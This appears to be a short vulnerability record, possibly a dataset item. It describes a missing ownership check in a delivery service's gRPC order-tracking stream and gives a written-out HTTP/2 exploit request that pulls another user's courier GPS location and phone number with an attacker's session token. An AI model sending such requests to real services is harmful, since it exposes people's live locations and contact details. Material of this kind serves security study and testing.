diagnosis: The bidirectional streaming RPC accepts arbitrary orderId values from incoming stream frames and transmits live courier GPS coordinates along with customer phone numbers. It validates session existence, but fails to check whether session.userId is the buyer or delivery driver for orderId, leaking real-time physical locations and contact numbers.
exploit_request:
POST /logistics.CourierService/LiveOrderTrackingStream HTTP/2.0
Host: logistics.deliveryhub.com
Content-Type: application/grpc
TE: trailers
session-token: <attacker_token>

[gRPC bidirectional stream payload: orderId: "ord_vip_confidential_4410"]
